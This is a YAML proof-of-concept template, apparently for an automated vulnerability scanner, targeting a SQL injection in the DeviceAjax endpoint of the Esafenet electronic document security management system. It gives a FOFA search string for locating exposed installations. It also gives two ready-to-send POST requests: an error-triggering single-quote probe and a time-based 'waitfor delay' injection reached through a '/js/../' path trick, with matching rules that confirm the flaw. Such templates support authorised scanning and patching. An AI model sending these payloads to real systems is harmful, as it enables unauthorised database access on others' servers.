id: poc-yaml-yisaitong-esafenet-deviceajax-sqli
info:
  name: 亿赛通电子文档安全管理系统 DeviceAjax SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: 亿赛通电子文档安全管理系统
  fofa: app="亿赛通-电子文档安全管理系统"
variables:
  t1: random_int(5,10)
  t2: t1 + 2
requests:
- method: POST
  path: /CDGServer3/js/../DeviceAjax
  headers:
    Content-Type: application/x-www-form-urlencoded
  data: command=delSecureUsb&SecureUsbid='
  expression: status_code == 200 && contains(headers,"CDGServer3") && gbk_decode(body)
    == "删除出错！"
- method: POST
  path: /CDGServer3/js/../DeviceAjax
  headers:
    Content-Type: application/x-www-form-urlencoded
  data: command=delSecureUsb&SecureUsbid=-1'waitfor delay '0:0:{{.t1}}'--
  expression: status_code == 200 && contains(headers,"CDGServer3") && body == "OK"
    && duration > t1 && duration < t2
transport: http
